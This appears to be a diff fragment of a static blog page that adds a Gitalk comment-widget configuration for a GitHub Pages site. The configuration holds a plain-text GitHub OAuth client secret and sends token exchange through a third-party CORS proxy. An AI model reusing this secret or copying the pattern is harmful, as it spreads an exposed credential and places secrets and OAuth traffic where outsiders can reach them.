+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"godrun666","repo":"godrun666.github.io","client_id":"7f8a0f5a5c88a0fea952","client_secret":"57250fa3a3b4cb1d0e0dad43bb1fffe7355d61a8","admin_user":"godrun666","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"0e68d6565507ddc56ae5504daf8167a4"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
